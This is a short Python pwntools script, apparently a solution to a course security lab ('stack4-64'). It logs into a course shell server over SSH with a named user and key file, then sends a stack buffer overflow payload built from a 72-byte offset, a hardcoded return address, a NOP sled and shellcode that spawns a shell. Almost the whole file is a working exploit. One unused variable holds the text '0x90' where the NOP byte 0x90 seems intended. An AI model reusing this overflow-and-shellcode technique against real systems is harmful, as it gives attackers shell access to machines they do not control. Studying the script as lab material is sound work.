#!/usr/bin/python
from pwn import *

context.clear(arch='amd64', log_level='debug')
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/stack4r-64_2_b2f572679e13c3a7b23f507a66548106/')
p = s.process(['./stack4-64'])

offset = 72
nop = b'0x90' * 1000
retaddr = 0x7fffffffeef8 
code = asm(shellcraft.amd64.nop())*1000+asm(shellcraft.amd64.sh())

assert b'\n' not in code

payload = flat({offset : retaddr + offset + 8}, code)

p.sendline(payload) 
p.interactive()